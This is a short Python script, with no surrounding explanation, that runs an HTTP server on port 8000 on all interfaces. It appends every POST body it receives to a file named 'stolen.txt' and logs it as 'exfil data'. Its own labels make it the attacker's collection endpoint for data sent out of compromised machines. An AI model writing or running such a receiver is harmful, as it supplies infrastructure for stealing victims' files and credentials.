from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)

        with open("stolen.txt", "ab") as f:
            f.write(data)

        print("Received exfil data:", len(data))

        self.send_response(200)
        self.end_headers()

server = HTTPServer(("0.0.0.0", 8000), Handler)
print("Exfil server running on port 8000")
server.serve_forever()